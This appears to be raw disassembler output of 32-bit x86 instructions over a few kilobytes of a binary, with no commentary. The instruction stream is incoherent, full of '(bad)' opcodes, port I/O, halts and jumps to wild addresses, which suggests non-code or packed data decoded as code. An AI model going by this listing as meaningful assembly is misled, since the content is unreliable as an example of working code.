  414f5b:	jb     0x414f9d
  414f5d:	out    dx,al
  414f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f5f:	pop    eax
  414f60:	in     eax,0xcb
  414f62:	addr16 dec eax
  414f64:	push   ecx
  414f65:	or     esi,DWORD PTR [ebp+eiz*8-0x6ca5c198]
  414f6c:	cmp    cl,BYTE PTR [ecx+0x6ea6cb87]
  414f72:	hlt    
  414f73:	icebp  
  414f74:	add    DWORD PTR [ebp+esi*1+0x7],0xffffffb5
  414f79:	push   esp
  414f7a:	psadbw mm6,QWORD PTR [edi-0x6c]
  414f7e:	ss add eax,0x76c383c9
  414f84:	aaa    
  414f85:	jo     0x415001
  414f87:	push   0x58dbcff8
  414f8c:	fdivr  st,st(6)
  414f8e:	jo     0x414f7f
  414f90:	xor    BYTE PTR [ecx+0x211bc3d1],dh
  414f96:	fucomip st,st(5)
  414f98:	scas   al,BYTE PTR es:[edi]
  414f99:	(bad)  
  414f9a:	ins    DWORD PTR es:[di],dx
  414f9c:	sub    BYTE PTR [ebx-0x18],0x50
  414fa0:	pop    esp
  414fa1:	adc    BYTE PTR [edi-0x78191244],ch
  414fa7:	jo     0x414ff6
  414fa9:	add    DWORD PTR [edx-0x42],eax
  414fac:	add    DWORD PTR [edx-0x75],0xffffffe9
  414fb0:	shl    ecx,0x2e
  414fb3:	and    DWORD PTR [edx-0x486d9eff],eax
  414fb9:	dec    esi
  414fba:	mov    bl,0x62
  414fbc:	test   DWORD PTR [esp+ecx*2],0xdcfbffd2
  414fc3:	pop    ds
  414fc4:	inc    ebp
  414fc5:	jmp    0x111c8a41
  414fca:	popf   
  414fcb:	scas   eax,DWORD PTR es:[edi]
  414fcc:	sub    BYTE PTR [esi+0x1980586f],bh
  414fd2:	push   esp
  414fd3:	push   ebx
  414fd4:	popf   
  414fd5:	push   ds
  414fd6:	loop   0x415000
  414fd8:	loope  0x415028
  414fda:	xchg   ax,ax
  414fdc:	push   eax
  414fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fde:	and    eax,0xe093a2f8
  414fe3:	pusha  
  414fe4:	out    0xd,eax
  414fe6:	lahf   
  414fe7:	xor    DWORD PTR [ecx+ebx*2],edi
  414fea:	xchg   edx,eax
  414feb:	xlat   BYTE PTR ds:[ebx]
  414fec:	fld    DWORD PTR [eax]
  414fee:	cmp    BYTE PTR [ecx+0x4],0xe2
  414ff2:	clc    
  414ff3:	sub    dl,BYTE PTR [esi+0x3]
  414ff6:	popf   
  414ff7:	cdq    
  414ff8:	test   ah,dh
  414ffa:	adc    al,BYTE PTR [ebp+0x74e08867]
  415000:	jg     0x414fbe
  415002:	sbb    al,BYTE PTR [edi+ebp*4-0x201d2a24]
  415009:	fsubp  st(6),st
  41500b:	adc    BYTE PTR [edi],bl
  41500d:	xchg   DWORD PTR [esp+ecx*4],ecx
  415010:	sar    BYTE PTR [ebx-0x46],0x3b
  415014:	jne    0x414faf
  415016:	jns    0x414fbb
  415018:	rcl    BYTE PTR [edx],1
  41501a:	add    DWORD PTR ds:0xbf10e21,edx
  415020:	sub    BYTE PTR [edi+0x6b],bl
  415023:	cmc    
  415024:	adc    ebx,ebx
  415026:	xor    ecx,DWORD PTR [eax-0x5243cef0]
  41502c:	xchg   esp,eax
  41502d:	sti    
  41502e:	loope  0x41504d
  415030:	adc    al,0x18
  415032:	xor    DWORD PTR [edi+0x5dddf4f8],ecx
  415038:	cld    
  415039:	lods   al,BYTE PTR ds:[esi]
  41503a:	data16 or al,0xf5
  41503d:	mov    ecx,0x261dfc7e
  415042:	aaa    
  415043:	mov    dl,0xc7
  415045:	mov    edx,0x251d260c
  41504a:	vpsubusw xmm0,xmm3,xmm7
  41504e:	mov    cl,0xed
  415050:	cmp    cl,BYTE PTR [ebx+0x3b]
  415053:	sbb    eax,0x6aecb69e
  415058:	pop    edx
  415059:	ss into 
  41505b:	mov    ah,0xd5
  41505d:	mov    al,ds:0xe5c35a3
  415062:	sbb    eax,0xb8f18abc
  415067:	or     esi,DWORD PTR [edx-0x2cf28f69]
  41506d:	pusha  
  41506e:	lahf   
  41506f:	dec    ebp
  415070:	jae    0x41501b
  415072:	loop   0x4150df
  415074:	add    edx,DWORD PTR [ebx-0x5a0e0661]
  41507a:	mov    al,BYTE PTR [ebp-0xe4fffa4]
  415080:	mov    ds:0x1ab1e031,al
  415085:	mov    ecx,0x1219ea46
  41508a:	call   0xf4590bd2
  41508f:	in     eax,dx
  415090:	and    BYTE PTR [bx+di-0x1e],dl
  415094:	push   ebx
  415095:	xchg   ebx,eax
  415096:	cld    
  415097:	shr    BYTE PTR [eax+0x20],0xc9
  41509b:	push   ecx
  41509c:	pop    es
  41509d:	or     eax,0x46628126
  4150a2:	(bad)  
  4150a4:	sar    DWORD PTR ds:0x6e629098,0x60
  4150ab:	cmp    edx,DWORD PTR [esi]
  4150ad:	popa   
  4150ae:	pop    edi
  4150b0:	cmp    DWORD PTR [edx],edi
  4150b2:	cmp    DWORD PTR ds:0xea8c1923,ecx
  4150b8:	jb     0x4150ec
  4150ba:	sub    esi,DWORD PTR [ebp+0x2383c54f]
  4150c0:	dec    edx
  4150c1:	dec    ebx
  4150c2:	add    edx,esp
  4150c4:	test   eax,0x4deabe7d
  4150c9:	sbb    ecx,DWORD PTR [ebx]
  4150cb:	and    al,0x8c
  4150cd:	rcr    BYTE PTR [ebp+ebx*1-0x13],1
  4150d1:	and    bh,dh
  4150d3:	and    edx,ebp
  4150d5:	cwde   
  4150d6:	xlat   BYTE PTR ds:[ebx]
  4150d7:	xchg   BYTE PTR ds:0xf3987573,dh
  4150dd:	out    dx,al
  4150de:	repz add esp,eax
  4150e1:	mov    eax,ds:0x46458c87
  4150e6:	sub    eax,DWORD PTR [ecx+0x207bc402]
  4150ec:	stc    
  4150ed:	pop    esi
  4150ee:	ins    BYTE PTR es:[edi],dx
  4150ef:	adc    dh,ah
  4150f1:	mov    bh,0x99
  4150f3:	cs mov ch,0x68
  4150f6:	test   al,0x7e
  4150f8:	call   0x13b91da9
  4150fd:	push   eax
  4150fe:	call   DWORD PTR [ebx-0x4e]
  415101:	test   DWORD PTR [edx-0x7d],eax
  415104:	jnp    0x4150e7
  415106:	rol    DWORD PTR [ebp-0x2d13a7eb],0x2b
  41510d:	(bad)
  415111:	into   
  415112:	lock (bad) 
  415114:	pop    ebx
  415115:	stos   BYTE PTR es:[edi],al
  415116:	xchg   al,ah
  415118:	mov    edi,0x4e82785b
  41511d:	add    ah,BYTE PTR [edx+0x303a7905]
  415123:	mov    ebp,0xd9d70bd0
  415128:	cli    
  415129:	jae    0x41514e
  41512b:	jecxz  0x41517c
  41512d:	enter  0xf3cc,0xaf
  415131:	out    0x6c,eax
  415133:	mov    DWORD PTR [ecx],esp
  415135:	call   0xa3c4687e
  41513a:	inc    ebx
  41513b:	xchg   BYTE PTR [edi+0x20e28704],dh
  415141:	or     BYTE PTR [ecx],dh
  415143:	pop    edi
  415144:	dec    esp
  415145:	cmp    esp,DWORD PTR [ebx+0x6a]
  415148:	jmp    0xb7d992d
  41514d:	test   dh,0x95
  415150:	or     esi,ebp
  415152:	shr    DWORD PTR [edx+0x76],0xb4
  415156:	mov    esp,0xa86129ae
  41515b:	fisubr WORD PTR [edx+0x1204cf]
	...
  415331:	add    BYTE PTR [eax],al
  415333:	add    BYTE PTR [esi-0x9b72fa0],al
  415339:	clc    
  41533a:	sahf   
  41533b:	out    dx,al
  41533c:	or     eax,0x9ab0d536
  415341:	jnp    0x415397
  415343:	je     0x41534c
  415345:	imul   eax,DWORD PTR [ecx],0x72200
  41534b:	add    BYTE PTR [ebx],cl
  41534d:	jmp    0x73b40313
  415352:	mov    ecx,0x855d4037
  415357:	fcomp  DWORD PTR [esi-0x68]
  41535a:	fidivr WORD PTR [esi+0x5c3bce61]
  415360:	pop    esi
  415361:	mov    ds:0xc06697fb,eax
  415366:	inc    esi
  415367:	ins    BYTE PTR es:[edi],dx
  415368:	into   
  415369:	or     ah,BYTE PTR [ebx-0x29ce4c06]
  41536f:	jmp    0x4153a3
  415371:	sbb    al,0x89
  415373:	xchg   WORD PTR [edi-0x1e],bp
  415377:	test   DWORD PTR [eax],ecx
  415379:	dec    edi
  41537a:	adc    DWORD PTR [esi+0x10],esp
  41537d:	fcomp  st(0)
  41537f:	mov    dh,BYTE PTR [ebx+0x6749b16c]
  415385:	sbb    BYTE PTR [edx-0x22],cl
  415388:	in     al,0x7b
  41538a:	es sub eax,0x78fed267
  415390:	xor    al,BYTE PTR [edx]
  415392:	iret   
  415393:	(bad)  [eax+ebp*2-0x3e]
  415397:	scas   eax,DWORD PTR es:[edi]
  415398:	adc    BYTE PTR [ebx-0x67f017b3],dl
  41539e:	imul   ebx,ebx,0x56ca731f
  4153a4:	les    eax,FWORD PTR [ebp-0x7]
  4153a7:	(bad)  
  4153a8:	or     DWORD PTR [ebx-0x6f],eax
  4153ab:	out    dx,ax
  4153ad:	xor    eax,0xdcab4a5e
  4153b2:	pop    eax
  4153b3:	scas   al,BYTE PTR es:[edi]
  4153b4:	inc    ebp
  4153b5:	push   ds
  4153b6:	cmp    eax,0x237fe71b
  4153bb:	adc    ah,BYTE PTR [ecx+edi*1]
  4153be:	fstp   TBYTE PTR [edi+0x685c78f4]
  4153c4:	pop    ss
  4153c5:	aas    
  4153c6:	dec    esi
  4153c7:	lods   al,BYTE PTR ds:[esi]
  4153c8:	and    eax,0xcda49bc6
  4153cd:	mov    ds:0x7bccb42f,eax
  4153d2:	out    0xbe,al
  4153d4:	mov    esp,0x9c817186
  4153d9:	sub    ah,BYTE PTR [edx+0x41]
  4153dc:	nop
  4153dd:	fst    QWORD PTR [ebp+0x71]
  4153e0:	mov    esi,0xf65243f6
  4153e5:	mov    ebp,0x15de818
  4153ea:	test   eax,0xcf2ca3c9
  4153ef:	ds lahf 
  4153f1:	add    BYTE PTR [esi-0x19],ch
  4153f4:	mov    ecx,0xe15f53b4
  4153f9:	sbb    DWORD PTR ds:0xd3bba0e5,esp
  4153ff:	jle    0x415462
  415401:	(bad)  
  415402:	mov    ch,0x25
  415404:	std    
  415405:	jle    0x41544a
  415407:	or     al,0xa4
  415409:	pop    es
  41540a:	jns    0x415470
  41540c:	shr    al,0xd4
  41540f:	mov    esi,0x78970751
  415414:	imul   ecx,DWORD PTR [ecx-0x26],0x2e42317d
  41541b:	imul   BYTE PTR [edi]
  41541d:	cmc    
  41541e:	pop    ebx
  41541f:	and    ebx,DWORD PTR [edx-0x783a7282]
  415425:	cs mov ebx,0x18b5efe9
  41542b:	mov    edi,0xb2ad2ff
  415430:	push   ds
  415431:	icebp  
  415432:	xchg   edx,eax
  415433:	gs inc esp
  415435:	into   
  415436:	daa    
  415437:	sub    DWORD PTR [edx-0x2c],edx
  41543a:	ins    BYTE PTR es:[edi],dx
  41543b:	shl    DWORD PTR [eax-0x30],0xfb
  41543f:	jp     0x415404
  415441:	add    DWORD PTR [ebx],ebx
  415443:	pop    ds
  415444:	nop
  415445:	inc    esp
  415446:	(bad)  
  415448:	stos   BYTE PTR es:[edi],al
  415449:	lahf   
  41544a:	retf   
  41544b:	push   0xc1258fde
  415450:	adc    ebx,edx
  415452:	in     eax,0x25
  415454:	push   0x912515c7
  415459:	push   ebx
  41545a:	mov    ch,0x90
  41545c:	lds    eax,FWORD PTR [ebx]
  41545e:	je     0x415449
  415460:	sub    dh,0xb2
  415463:	and    eax,0xe5d3b0d7
  415468:	sub    esi,DWORD PTR [edi+0x50de9999]
  41546e:	fs mov ecx,0xd325fb1c
  415474:	fnstenv [edi-0x6443f0d6]
  41547a:	dec    edi
  41547b:	fprem1 
  41547d:	sub    cl,BYTE PTR [ecx-0x32030866]
  415483:	inc    ecx
  415484:	fimul  WORD PTR [edi]
  415486:	stc    
  415487:	into   
  415488:	call   0xfd40bb58
  41548d:	add    BYTE PTR [ebx+0x4acef634],bh
  415493:	xor    cl,BYTE PTR [eax+0x122e2be1]
  415499:	sahf   
  41549a:	dec    eax
  41549b:	jo     0x415489
  41549d:	push   esp
  41549e:	or     edx,DWORD PTR [esi-0x1b0de12a]
  4154a4:	push   edx
  4154a5:	aas    
  4154a6:	add    eax,0xdb7b3b3
  4154ab:	sar    al,1
  4154ad:	mov    eax,ds:0xfcfda93b
  4154b2:	ss test eax,0xa291a543
  4154b8:	push   ss
  4154b9:	jno    0x415448
  4154bb:	mov    bh,0xd7
  4154bd:	imul   esi,DWORD PTR ds:0xec216ca0,0x5b
  4154c4:	ja     0x41550d
  4154c6:	hlt    
  4154c7:	into   
  4154c8:	push   esp
  4154c9:	imul   ebp,DWORD PTR [edi+0x13],0x89490bda
  4154d0:	loope  0x415500
  4154d2:	cs out 0x2d,al
  4154d5:	cmp    esp,DWORD PTR [ecx-0x76c84518]
  4154db:	aam    0x76
  4154dd:	es enter 0x57b2,0x50
  4154e2:	nop
  4154e3:	arpl   WORD PTR [ebp-0x6e006ba5],bp
  4154e9:	adc    eax,0x2ebb7793
  4154ee:	mov    cl,0x14
  4154f0:	aad    0xe0
  4154f2:	call   FWORD PTR [ebx+eiz*2+0x51]
  4154f6:	adc    cl,BYTE PTR [ecx+0x6d46fa0a]
  4154fc:	cmp    ebp,DWORD PTR [esi]
  4154fe:	cdq    
  4154ff:	sbb    al,0xf
  415501:	mov    dh,0xed
  415503:	or     BYTE PTR [ebx],bh
  415505:	sbb    esp,DWORD PTR [edi]
  415507:	jb     0x41548a
  415509:	sbb    eax,DWORD PTR [eax-0x2d4a83b4]
  41550f:	out    dx,eax
  415510:	retf   
  415511:	mov    ds:0x37c4ec55,eax
  415516:	push   edx
  415517:	jno    0x4154cf
  415519:	aam    0x29
  41551b:	fisub  DWORD PTR [edi-0x9217a22]
  415521:	sbb    cl,BYTE PTR [ecx+0x4090e8d]
  415527:	xchg   ebx,eax
  415528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415529:	sub    BYTE PTR [ecx-0xe],ah
  41552c:	lea    esi,[ecx-0x6a]
  41552f:	mov    bl,0x7d
  415531:	(bad)  
  415532:	iret   
  415533:	and    al,0xa4
  415535:	xor    cl,dh
  415537:	mov    ecx,0xe07ca759
  41553c:	fisttp WORD PTR [eax]
  41553e:	sub    ecx,DWORD PTR [edx]
  415540:	pop    esi
  415541:	inc    esi
  415542:	pop    es
  415543:	and    ebp,DWORD PTR [esi-0x10]
  415546:	xor    al,0x7b
  415548:	dec    ecx
  415549:	loopne 0x4154f8
  41554b:	loop   0x415540
  41554d:	inc    ebx
  41554e:	push   ebx
  41554f:	sub    BYTE PTR [eax],dl
  415551:	mov    ds:0xc9f205ca,eax
  415556:	loop   0x415535
  415558:	mov    ds:0x3c7b760f,al
  41555d:	dec    edx
  41555e:	add    DWORD PTR [esp+eax*1],edx
  415561:	gs jmp 0x415543
  415564:	hlt    
  415565:	das    
  415566:	adc    dh,BYTE PTR [ebx+0x65ce56d6]
  41556c:	adc    edx,DWORD PTR [ebx-0x5f]
  41556f:	mov    bl,0x5c
  415571:	arpl   WORD PTR [ebp-0x33],cx
  415574:	mov    al,ds:0x49a57a49
  415579:	or     esp,esp
  41557b:	jp     0x415593
  41557d:	mov    ds:0xb495c885,eax
  415582:	clc    
  415583:	xor    eax,0xb8e86db
  415588:	fimul  DWORD PTR [ecx-0x49]
  41558b:	adc    BYTE PTR [edx-0x6d],0xcb
  41558f:	sub    al,0x9c
  415591:	pop    eax
  415592:	sahf   
  415593:	mov    al,ds:0xae9606f8
  415598:	or     BYTE PTR [ebp-0x53],dl
  41559b:	pushf  
  41559c:	fild   DWORD PTR [eax]
  41559e:	idiv   DWORD PTR [ebp+0xf]
  4155a1:	test   eax,0x6da2ce71
  4155a6:	enter  0xf608,0xfe
  4155aa:	or     eax,0x5ef8ca23
  4155af:	outs   dx,DWORD PTR ds:[esi]
  4155b0:	ja     0x111b86be
  4155b6:	mov    cs,WORD PTR [ebp+ebp*8+0x24]
  4155ba:	mov    bl,0xd7
  4155bc:	and    dh,dh
  4155be:	lods   eax,DWORD PTR ds:[esi]
  4155bf:	enter  0x97c8,0xfd
  4155c3:	push   0xa8b941ad
  4155c8:	xor    dh,BYTE PTR [eax+esi*4]
  4155cb:	dec    ebp
  4155cc:	in     al,0x62
  4155ce:	xchg   edi,eax
  4155cf:	and    ecx,esi
  4155d1:	ret    
  4155d2:	add    BYTE PTR [edi+0x6dddeeee],ch
  4155d8:	or     ebp,0xbc09c789
  4155de:	scas   al,BYTE PTR es:[edi]
  4155df:	cli    
  4155e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155e1:	dec    esp
  4155e2:	mov    bh,0x70
  4155e4:	mov    dh,0x5
  4155e6:	sub    DWORD PTR [ebx],ebx
  4155e8:	and    ebp,eax
  4155ea:	push   es
  4155eb:	stc    
  4155ec:	sub    dh,BYTE PTR [esi-0x5f]
  4155ef:	pop    ebp
  4155f0:	into   
  4155f1:	and    eax,0x530b07f5
  4155f6:	pop    esp
  4155f7:	jnp    0x4155c1
  4155f9:	cmp    cl,BYTE PTR [edi-0x6ac3b79]
  4155ff:	das    
  415600:	pop    esp
  415601:	inc    esi
  415602:	jl     0x4155bd
  415604:	shr    DWORD PTR [edx-0x758ab068],cl
  41560a:	rcl    dh,0xcb
  41560d:	xchg   edx,eax
  41560e:	repnz loope 0x4155d5
  415611:	mov    edi,DWORD PTR [edi+0x4a]
  415614:	jle    0x415596
  415616:	pop    es
  415617:	pop    eax
  415618:	xor    DWORD PTR [ecx],ebx
  41561a:	popf   
  41561b:	mov    ds:0xd11ca8db,al
  415620:	xlat   BYTE PTR ds:[ebx]
  415621:	and    al,0x80
  415623:	retf   0xb97f
  415626:	mov    al,ds:0x32643682
  41562b:	imul   eax,edx,0xa
  41562e:	pop    ds
  41562f:	mov    ebp,0xfc8b2b9a
  415634:	fsub   QWORD PTR [ebp+ecx*1-0x6555ffef]
  41563b:	test   BYTE PTR ds:0xb01912ed,bh
  415641:	pusha  
  415642:	cs stos BYTE PTR es:[edi],al
  415644:	lods   eax,DWORD PTR ds:[esi]
  415645:	xor    DWORD PTR [ebx-0x48],esp
  415648:	iret   
  415649:	pop    edx
  41564a:	mov    al,ds:0x69321b1
  41564f:	(bad)  
  415650:	inc    edx
  415651:	sub    esp,edi
  415653:	hlt    
  415654:	(bad)  
  415656:	jecxz  0x41562f
  415658:	into   
  415659:	retf   
  41565a:	loop   0x415675
  41565c:	sub    al,bl
  41565e:	popf   
  41565f:	mov    edi,edx
  415661:	into   
  415662:	shr    ah,0xca
  415665:	inc    cl
  415667:	and    eax,0x19e2c947
  41566c:	mov    esp,0x742c41fc
  415671:	push   ds
  415672:	push   ebx
  415673:	rol    ebp,cl
  415675:	cmp    bh,BYTE PTR [edx-0x32]
  415678:	nop
  415679:	pushf  
  41567a:	mov    ds:0xb71542f5,eax
  41567f:	outs   dx,BYTE PTR ds:[esi]
  415680:	es dec edx
  415682:	mov    eax,ds:0x1dff3166
  415687:	out    0xe8,eax
  415689:	stos   BYTE PTR es:[edi],al
  41568a:	xchg   DWORD PTR [ebp+0x9],ecx
  41568d:	sbb    dh,al
  41568f:	push   esi
  415690:	popf   
  415691:	mov    cl,0x6b
  415693:	xchg   esi,eax
  415694:	aad    0xab
  415696:	in     eax,dx
  415697:	push   ecx
  415698:	dec    edx
  415699:	sbb    dl,bh
  41569b:	jnp    0x41564a
  41569d:	inc    esi
  41569e:	mov    bh,0xeb
  4156a0:	mov    eax,0x7558a8d5
  4156a5:	imul   ebx,DWORD PTR [ebx+0x53],0x4f4263cf
  4156ac:	movq   mm6,QWORD PTR [ecx+0x2630620c]
  4156b3:	stos   BYTE PTR es:[edi],al
  4156b4:	nop
  4156b5:	push   cs
  4156b6:	adc    eax,0x82c49787
  4156bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156bc:	pop    edi
  4156bd:	mov    esi,DWORD PTR [edi-0x8]
  4156c0:	fdivr  QWORD PTR [edi-0x29e9e75e]
  4156c6:	sub    cl,BYTE PTR [ebp+esi*1-0x74]
  4156ca:	xchg   ecx,eax
  4156cb:	xchg   edi,eax
  4156cc:	add    DWORD PTR [eax-0x1a1d0816],0xea1e36a5
  4156d6:	mov    bl,0x65
  4156d8:	icebp  
  4156d9:	mov    eax,0xcc6a165f
  4156de:	cli    
  4156df:	pop    eax
  4156e0:	mov    dh,0x33
  4156e2:	mov    ch,0xf
  4156e4:	(bad)  
  4156e5:	cmp    al,0xaf
  4156e7:	adc    ecx,DWORD PTR [eax+0x1d34c73f]
  4156ed:	cmp    BYTE PTR [eax+0x56f3102b],ch
  4156f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156f4:	out    dx,eax
  4156f5:	and    ecx,DWORD PTR [eax]
  4156f7:	pushf  
  4156f8:	int    0x4b
  4156fa:	test   al,0x61
  4156fc:	add    BYTE PTR [edx],cl
  4156fe:	sbb    BYTE PTR [ecx],al
  415700:	aad    0xc0
  415702:	popf   
  415703:	dec    eax
  415704:	jne    0x4156c7
  415706:	mov    esp,0xa16a93c9
  41570b:	fiadd  WORD PTR [eax-0x3900e30c]
  415711:	mov    dl,0x8d
  415713:	test   DWORD PTR [edi],eax
  415715:	adc    al,BYTE PTR ds:0x334d80fc
  41571b:	js     0x41573a
  41571d:	push   edx
  41571e:	dec    edi
  41571f:	and    ebx,DWORD PTR [ebx]
  415721:	jnp    0x41575e
  415723:	stos   BYTE PTR es:[edi],al
  415724:	sbb    esp,DWORD PTR [ebp+0x66f0863e]
  41572a:	out    dx,eax
  41572b:	cli    
  41572c:	or     eax,0x78c3238e
  415731:	add    DWORD PTR [eax],0x7290c7f4
  415737:	mov    ebp,0x8d7faa8c
  41573c:	aas    
  41573d:	ins    DWORD PTR es:[edi],dx
  41573e:	rol    BYTE PTR [eax-0x72],1
  415741:	inc    esp
  415742:	xchg   esp,eax
  415743:	jg     0x4156d0
  415745:	push   0xb02e3f4f
  41574a:	aam    0xc9
  41574c:	adc    edi,DWORD PTR [edx+esi*1+0x45d4fecc]
  415753:	sar    ch,0xc5
  415756:	addr16 and al,0x5c
  415759:	lods   al,BYTE PTR ds:[esi]
  41575a:	push   0x3f
  41575c:	sub    bl,BYTE PTR [edx-0x1c]
  41575f:	loope  0x415792
  415761:	sbb    DWORD PTR [esi],edi
  415763:	shr    BYTE PTR [ebx],cl
  415765:	jle    0x415760
  415767:	mov    edi,0x986fbb4c
  41576c:	mov    ?,ebx
  41576e:	adc    al,0x50
  415770:	ret    0xe2b
  415773:	outs   dx,DWORD PTR ds:[esi]
  415774:	sar    ecx,0x98
  415777:	xchg   ebx,eax
  415778:	xchg   ecx,eax
  415779:	jae    0x4157d6
  41577b:	retf   0xd4d4
  41577e:	cmp    dh,BYTE PTR [ecx+0x5356c882]
  415784:	xchg   edi,eax
  415785:	icebp  
  415786:	test   BYTE PTR [ebx-0x48],ch
  415789:	lods   eax,DWORD PTR ds:[esi]
  41578a:	add    BYTE PTR [ecx],dl
  41578c:	pop    esi
  41578d:	mov    edx,0x3f68d626
  415792:	fs out 0xf0,eax
  415795:	in     eax,dx
  415796:	mov    eax,ds:0x1343a191
  41579b:	sbb    al,0x51
  41579d:	jae    0x41571f
  41579f:	sub    ch,BYTE PTR [ebx-0x9]
  4157a2:	sbb    bh,dl
  4157a4:	dec    edx
  4157a5:	loop   0x4157ed
  4157a7:	rcl    dh,1
  4157a9:	mov    ebp,0x3e602a7f
  4157af:	loopne 0x41576d
  4157b1:	and    BYTE PTR [esi+0x26],ah
  4157b4:	lahf   
  4157b5:	out    0x43,al
  4157b7:	sub    al,0xbd
  4157b9:	idiv   BYTE PTR [edi+edx*8]
  4157bc:	repz sahf 
  4157be:	pop    edx
  4157bf:	or     BYTE PTR [ebp+0x6f2a8b5a],ah
  4157c5:	sub    al,0x70
  4157c7:	aam    0xf1
  4157c9:	sbb    eax,0xc79ae430
  4157ce:	pop    eax
  4157cf:	test   al,0xf2
  4157d1:	mov    ch,BYTE PTR [eax]
  4157d3:	mov    al,ds:0xf133de85
  4157d8:	nop
  4157d9:	or     al,0xb0
  4157db:	outs   dx,DWORD PTR ds:[esi]
  4157dc:	push   esp
  4157dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157de:	nop
  4157df:	jg     0x415846
  4157e1:	jmp    0x6d6da33a
  4157e6:	imul   edi,DWORD PTR [ebx+ebx*1],0xffffff8f
  4157ea:	push   edx
  4157eb:	nop
  4157ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157ed:	jne    0x415810
  4157ef:	lea    esi,[ecx+0x19f4046e]
  4157f5:	and    DWORD PTR [ebx+ecx*4],esi
  4157f8:	pop    esp
  4157f9:	inc    esp
  4157fa:	or     ebp,DWORD PTR [ecx]
  4157fc:	into   
  4157fd:	loope  0x415847
  4157ff:	test   eax,0xa16693a8
  415804:	or     eax,0x3fc97e2d
  415809:	push   edi
  41580a:	jl     0x41580e
  41580c:	in     al,dx
  41580d:	es call 0xe735:0x142a19f0
  415815:	adc    edx,edi
  415817:	and    cl,cl
  415819:	xor    BYTE PTR [esi-0xca2f2b6],dh
  41581f:	push   ebx
  415820:	mov    bh,0x17
  415822:	hlt    
  415823:	popa   
  415824:	and    dh,dl
  415826:	dec    ebx
  415827:	mov    ebp,0x429d1aec
  41582c:	jecxz  0x415813
  41582e:	fnsave [eax+0x30eb0dc9]
  415834:	repnz push ds
  415836:	adc    DWORD PTR [ecx+0x4a52d866],0xffffffb1
  41583d:	ins    BYTE PTR es:[edi],dx
  41583e:	pop    ecx
  41583f:	pop    esi
  415840:	inc    ecx
  415841:	out    dx,al
  415842:	outs   dx,BYTE PTR ds:[esi]
  415843:	push   cs
  415844:	pop    edx
  415845:	mov    bh,0xb6
  415847:	mov    dh,0x43
  415849:	cmp    al,0xde
  41584b:	mov    al,ds:0x48fc4ffa
  415850:	xlat   BYTE PTR ds:[ebx]
  415851:	mov    cl,BYTE PTR [esi+0x4482b953]
  415857:	mov    ecx,0x4728626d
  41585c:	cmc    
  41585d:	in     eax,dx
  41585e:	jp     0x415883
  415860:	stc    
  415861:	cli    
  415862:	stc    
  415863:	jmp    0x267e4a32
  415868:	jb     0x41580f
  41586a:	mov    WORD PTR [ebx+0x36115205],?
  415870:	cmp    dh,bh
  415872:	into   
  415873:	mov    ecx,esi
  415875:	cmp    edx,eax
  415877:	lods   eax,DWORD PTR ds:[esi]
  415878:	inc    ebp
  415879:	int3   
  41587a:	xchg   esp,eax
  41587b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41587c:	or     al,BYTE PTR [eax-0x38]
  41587f:	ror    BYTE PTR [ecx+0x19],1
  415882:	and    eax,0xf27ce8fb
  415887:	push   ebx
  415888:	dec    esp
  415889:	adc    eax,0x7e91c8e
  41588e:	jbe    0x415906
  415890:	dec    ebp
  415891:	dec    ecx
  415892:	stc    
  415893:	gs pop ebp
  415895:	sti    
  415896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415897:	xor    eax,0xcfc4eea9
  41589c:	jge    0x41590d
  41589e:	das    
  41589f:	xchg   esi,eax
  4158a0:	lods   al,BYTE PTR ds:[esi]
  4158a1:	mov    dl,0xf0
  4158a3:	pushf  
  4158a4:	and    DWORD PTR [esi+0x723cb201],0xab8028ee
  4158ae:	lods   al,BYTE PTR ds:[esi]
  4158af:	enter  0x7744,0x63
  4158b3:	ins    DWORD PTR es:[edi],dx
  4158b4:	lea    ebx,[ebp+ebp*1-0x79]
  4158b8:	rol    DWORD PTR [edi+0x32],0xae
  4158bc:	mov    al,ds:0xe9f514c4
  4158c1:	push   0xffffffef
  4158c3:	sbb    edx,DWORD PTR [ebx-0x48]
  4158c6:	fs repnz dec ecx
  4158c9:	ret    0xd0b8
  4158cc:	push   cs
  4158cd:	lahf   
  4158ce:	jp     0x415889
  4158d0:	out    0xfc,eax
  4158d2:	pop    ecx
  4158d3:	retf   
  4158d4:	cld    
  4158d5:	ja     0x415919
  4158d7:	cmp    al,0x83
  4158d9:	ss adc al,0x28
  4158dc:	popa   
  4158dd:	jmp    0xbf47653c
  4158e2:	inc    esi
  4158e3:	(bad)  [ebx+0x55]
  4158e6:	(bad)  [esi-0x4b8eb8ae]
  4158ec:	call   0xe50e:0x52af5852
  4158f3:	xlat   BYTE PTR ds:[ebx]
  4158f4:	mov    dl,0x46
  4158f6:	int    0x7d
  4158f8:	or     al,0x83
  4158fa:	ror    DWORD PTR [ebx+0x4393097e],1
  415900:	out    dx,eax
  415901:	ret    0xe3f0
  415904:	pop    ebp
  415905:	mov    eax,ds:0x5d181ab8
  41590a:	out    0xd2,al
  41590c:	mov    ecx,0x53988e7e
  415911:	xor    ecx,DWORD PTR [eax*8+0x4d5a4513]
  415918:	rol    esi,1
  41591a:	mov    esi,0xe6bce27e
  41591f:	xchg   ebp,eax
  415920:	push   ss
  415921:	loop   0x41596d
  415923:	jle    0x4158bb
  415925:	and    al,0xd
  415927:	popa   
  415928:	mov    ebx,0x64b33a76
  41592d:	xchg   esp,eax
  41592e:	leave  
  41592f:	add    eax,0xda146a37
  415934:	cdq    
  415935:	dec    edi
  415936:	pop    edx
  415937:	outs   dx,DWORD PTR ds:[esi]
  415938:	push   esi
  415939:	mov    WORD PTR [edi-0x1f8396fb],gs
  41593f:	add    BYTE PTR [ebp+0x3c],dl
  415942:	imul   esi,DWORD PTR [ebx-0x69],0xffffffd9
  415946:	push   edi
  415947:	popf   
  415948:	shr    ebp,0x51
  41594b:	inc    ecx
  41594c:	std    
  41594d:	xlat   BYTE PTR ds:[ebx]
  41594e:	mov    ebp,0x2a7b4c52
  415953:	dec    eax
  415954:	fadd   QWORD PTR [edi]
